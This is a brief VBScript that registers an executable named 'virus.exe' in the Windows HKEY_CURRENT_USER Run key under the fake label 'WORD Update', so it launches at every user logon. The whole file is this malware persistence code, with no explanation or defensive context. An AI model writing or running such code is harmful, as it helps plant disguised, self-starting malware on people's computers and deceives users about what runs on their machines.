Set fso = CreateObject("Scripting.FileSystemObject")
put = fso.GetParentFolderName(WScript.ScriptFullName) + "\virus.exe"
Dim vOrg, objArgs, root, key, WshShell
root = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\"
KeyHP = "WORD Update"
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite root+keyHP,put